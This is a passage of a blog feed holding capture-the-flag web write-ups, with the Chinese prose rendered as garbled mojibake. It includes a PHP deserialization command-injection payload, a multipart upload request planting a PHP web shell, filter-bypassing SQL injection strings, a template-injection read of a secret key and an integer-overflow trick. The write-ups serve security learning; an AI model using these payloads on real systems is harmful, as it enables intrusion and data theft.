class="string">&quot;flag&#123;b7e6122d-1c84-4785-a788-eeee18e17ac4&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="web2">web2</h2><p>æ‰«ç›®å½•,å‘ç°swp,æ¢å¤æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[&lt;&gt;*;?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$host</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echo&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">                                                    &#125;</span><br><span class="line">                         &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="variable">$ccc</span>=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>===<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$first</span>===<span class="string">&quot;doller&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$var</span>===<span class="string">&quot;give&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$bbb</span>===<span class="string">&quot;me&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ccc</span>===<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">                <span class="title function_ invoke__">unserialize</span>(<span class="variable">$come</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Macbook:/var/www/html  <span class="comment"># curl &quot;http://127.0.0.1?first=doller&amp;a=var%3dgive%26bbb%3dme%26ccc%3dflag&quot;</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°ååºåˆ—åŒ– ç„¶åç”¨<code>$IFS</code>ç»•è¿‡ç©ºæ ¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$one</span> = <span class="keyword">new</span> <span class="title function_ invoke__">come</span>(<span class="string">&quot;echo&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;`cat$IFS/flflagag`&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$one</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/11/2018-11-05-11-14-32å±å¹•æˆªå›¾.png"><img src="/images/2018/11/2018-11-05-11-14-32å±å¹•æˆªå›¾.png" /></a></p><h2 id="web3">web3</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//error_reporting(0);</span></span><br><span class="line">    <span class="comment">//$dir=md5(&quot;icq&quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span></span><br><span class="line">    <span class="variable">$dir</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&quot;icq&quot;</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/sandbox/&#x27;</span> . <span class="variable">$dir</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">        <span class="variable">$filename</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ext</span>==<span class="variable">$filename</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$filename</span>) - <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;emmmm...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$new_name</span> = (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>,<span class="number">999</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$new_name</span>);</span><br><span class="line">        <span class="variable">$_</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(@<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&#x27;@&lt;?php&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$_</span>,<span class="variable">$new_name</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$_</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$new_name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ext</span>==<span class="variable">$filename</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$filename</span>) - <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;emmmm...&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$test</span>[<span class="number">1</span>]=<span class="number">456</span>;</span><br><span class="line"><span class="variable">$test</span>[<span class="number">0</span>]=<span class="number">123</span>;                                                     </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$test</span>)-<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/var/www/html/second.php:5:</span></span><br><span class="line"><span class="comment">array (size=2)</span></span><br><span class="line"><span class="comment">  1 =&gt; int 456</span></span><br><span class="line"><span class="comment">  0 =&gt; int 123</span></span><br><span class="line"><span class="comment">/var/www/html/second.php:6:int 123</span></span><br><span class="line"><span class="comment">/var/www/html/second.php:7:int 456</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåé¢å¯ä»¥è·¯å¾„æˆªæ–­ä¸€ä¸‹,ç„¶ååŒ…å«å°±å¯ä»¥äº† è¿™é‡Œè¿˜å­¦åˆ°äº†unlinkçš„ä¸€ä¸ªç»•è¿‡,å‚è€ƒ:<a href="https://www.cnblogs.com/arongmh/p/8328470.html" title="https://www.cnblogs.com/arongmh/p/8328470.html">https://www.cnblogs.com/arongmh/p/8328470.html</a> å¤§æ¦‚å°±æ˜¯phpè¯»å†™æ–‡ä»¶çš„æ—¶å€™ä¼šç”¨<code>php_stream_open_wrapper_ex</code>å»æ‰“å¼€,ä»è€Œåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨,è€Œåˆ é™¤åˆ™ä¸æ˜¯,å¦‚æœæ–‡ä»¶åé‡Œé¢æœ‰ä¸å­˜åœ¨çš„è·¯å¾„,é‚£ä¹ˆå°±ä¼šå¯¼è‡´åˆ é™¤å¤±è´¥. ç»¼åˆpayload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>118ccb81ba1a41739d43b14979553ba5003a67d6e50945c0.game.ichunqiu.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>curl/7.61.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>518</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------99b94f48d2d866ad</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;index.php&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@&lt;?php <span class="keyword">system</span>(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file[1]&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">def</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file[0]&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">php/../<span class="number">123.</span>php</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;hehe&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">./<span class="number">123.</span>php</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°flag <a href="/images/2018/11/2018-11-05-12-27-40å±å¹•æˆªå›¾.png"><img src="/images/2018/11/2018-11-05-12-27-40å±å¹•æˆªå›¾.png" /></a></p><h2 id="web4">web4</h2><p>ç®€å•ç‚¹å‡ ä¸‹,å‘ç°æŸ¥è¯¢ç”¨æˆ·å’Œç™»å½•åŠŸèƒ½ æŸ¥è¯¢ç”¨æˆ·ç®€å•æµ‹è¯•,å‘ç°æ³¨å…¥,åŠ ä¸Šæç¤º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$value</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$content</span>)</span><br></pre></td></tr></table></figure><p>å»ç®€å•æ¢æµ‹ä¸€ä¸‹è¿‡æ»¤çš„ä¸œè¥¿,å‘ç°from,selectæ›¿æ¢æˆäº†ç©º,è€Œinformation_schemaå’Œunionæ˜¯è¢«banäº†. æ¢æµ‹åˆ é™¤äº†å•¥å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^&#x27;from&#x27;%23</span><br></pre></td></tr></table></figure><p>å‘ç°è¿”å›æ­£å¸¸,é‚£ä¹ˆ'from'è‚¯å®šæ˜¯è¢«æ¢æˆäº†ç©ºäº†. ç„¶åinformation_schemaè¢«è¿‡æ»¤,è¿™é‡Œç»•è¿‡çš„æ–¹æ³•å¾ˆå¤š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.innodbç»•è¿‡,ä½†æ˜¯æ— æ³•æŸ¥åˆ—å</span><br><span class="line">2.information . schemaç»•è¿‡(ç‚¹å·¦å³åŠ ç©ºæ ¼)</span><br><span class="line">3.informafromtion_schema(ä¸­é—´åŠ æ›¿æ¢å­—æ®µ)</span><br></pre></td></tr></table></figure><p>ç„¶åæœ¬æ¥æˆ‘æ˜¯ç›²æ³¨çš„,è¿™é‡Œå¯ä»¥å°†æ›¿æ¢å­—æ®µæ’å…¥unionæ¥è¿›è¡Œunionæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=12&#x27;unifromon seleselectct 1,(selselectect group_concat(table_name) frfromom information_schefromma.tables where table_schema=database())%23</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest,user</span><br></pre></td></tr></table></figure><p>æå–åˆ—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password</span><br></pre></td></tr></table></figure><p>è¯»å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e3274be5c857fb42ab72d786e281b4b8</span><br></pre></td></tr></table></figure><p><a href="/images/2018/11/2018-11-05-12-41-32å±å¹•æˆªå›¾.png"><img src="/images/2018/11/2018-11-05-12-41-32å±å¹•æˆªå›¾.png" /></a> è§£ä¸€ä¸‹æ‹¿åˆ°å¯†ç :adminpassword è¿›å»å‘ç°æ–‡ä»¶ä¸Šä¼ ,éšæ„ä¼ ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uploaded to ./1.png.txt</span><br><span class="line">please upload to ./flag.php</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è·¯å¾„ç»•è¿‡php,ä½†æ˜¯åé¢è¿˜æœ‰ä¸ª<code>.txt</code> è¿™ä¸ªåœ°æ–¹å¡äº†,çœ‹äº†wpæ‰çŸ¥é“ç”¨çš„%02æˆªæ–­çš„... è¿™ä¸ªå­—ç¬¦æ˜¯è·‘äº†ä¸€éä¸å¯è§å­—ç¬¦è·‘å‡ºæ¥çš„... <a href="/images/2018/11/2018-11-05-12-50-36å±å¹•æˆªå›¾.png"><img src="/images/2018/11/2018-11-05-12-50-36å±å¹•æˆªå›¾.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>äº’ç½‘æ¯webwp</title>
      <link href="/2018/10/18/%E4%BA%92%E7%BD%91%E6%9D%AFwebwp/"/>
      <url>/2018/10/18/%E4%BA%92%E7%BD%91%E6%9D%AFwebwp/</url>
      
        <content type="html"><![CDATA[<p>å¤ªå¤šæ²¡æ‰“è¿‡çš„ä¸œè¥¿äº†,ä¸€é“tornado,ä¸€é“javaçš„fastjsonååºåˆ—åŒ–,ä¸€é“goçš„æº¢å‡º...è¿˜æœ‰ä¸€é“å¾ˆéš¾ä½†æ˜¯å‡ºçš„å¾ˆå¥½çš„php... å‚è€ƒ:<a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" title="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/">http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/</a> <a href="https://xz.aliyun.com/t/2912" title="https://xz.aliyun.com/t/2912">https://xz.aliyun.com/t/2912</a></p><h2 id="easy-tornado">easy tornado</h2><p>è¿›å»å‘ç°ä¸‰ä¸ªé“¾æ¥,å¯¹åº”ä¸‰ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/file?filename=Orz.txt&amp;signature=9e3bb6483951e58b6095f949d572dd9a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line">http://49.4.78.81:30980/file?filename=hint.txt&amp;signature=74dfcb55b94ddbe4daedd3f21a68a2f1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line">http://49.4.78.81:30980/file?filename=flag.txt&amp;signature=6a86c265598a92ae8bff5c9f7b9f2a72</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure><p>è®¿é—®æ–‡ä»¶éœ€è¦ç­¾å,ç­¾åéœ€è¦cookie_secret å°è¯•åˆ æ‰ç­¾å,çˆ†äº†error</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/error?msg=xxx</span><br></pre></td></tr></table></figure><p>çŒœæƒ³ssti,è¯•äº†ä¸€ä¸‹7*7,å‘ç°è¿‡æ»¤äº†* ç®€å•fuzzä¸€ä¸‹,å‘ç°è¿‡æ»¤äº†ä¸€å †å­—ç¬¦,æ‹¿åˆ°shellæ˜¯ä¸å¤§å¯èƒ½äº†,çœ‹èƒ½ä¸èƒ½è¯»åˆ°cookie_secretå§ åç»­æµ‹è¯•ä¸€ä¸‹,å‘ç°å¯ä»¥ç”¨handlerå’Œrequest.å»çœ‹tornadoæºç <a href="https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py" title="https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py">https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</a> å°è¯•è®¿é—®<code>&#123;&#123;handler.settings&#125;&#125;</code>,ç„¶åæ‹¿åˆ°cookie_secret æ„é€ ç­¾åè®¿é—®flagå³å¯</p><h2 id="ltshop">ltshop</h2><p>goå†™çš„,ç®—æ˜¯å­¦ä¹ äº†å§,goçš„int64å­˜åœ¨æº¢å‡º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.it1352.com/808569.html</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåªæœ‰20å—,æ¡ä»¶ç«äº‰å‘åŒ…æ‹¿åˆ°5ä¸ªä»¥ä¸Šè¾£æ¡,ç„¶åflagéœ€è¦99999999ä¸ªå¤§è¾£æ¡,è¿™è‚¯å®šä¸å¤Ÿ,çŒœæƒ³ä»£ç é€»è¾‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(da_la_tiao * 5 &lt;= user_latiao)</span><br><span class="line">&#123;</span><br><span class="line">    success</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    fail</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ æº¢å‡º <a href="/images/2018/10/2018-10-15-13-40-01å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-15-13-40-01å±å¹•æˆªå›¾.png" /></a> æˆ‘ä»¬å¡«3689348814741910324,é‚£ä¹ˆç®—çš„æ—¶å€™<code>3689348814741910324 * 5</code>æº¢å‡º,æ•°å€¼å°äºæˆ‘ä»¬è¾£æ¡æ•°é‡,å…‘æ¢æˆåŠŸ,é‚£ä¹ˆç›´æ¥å»æ¢flagå°±ok</p><h2 id="easy_web">easy_web</h2><p>javaé¢˜... åç»­å¯èƒ½ä¸“é—¨å†™ä¸€ç¯‡åšå®¢,çœ‹æƒ…å†µäº†.... ç„¶åå¤©æ¢çš„wp <a 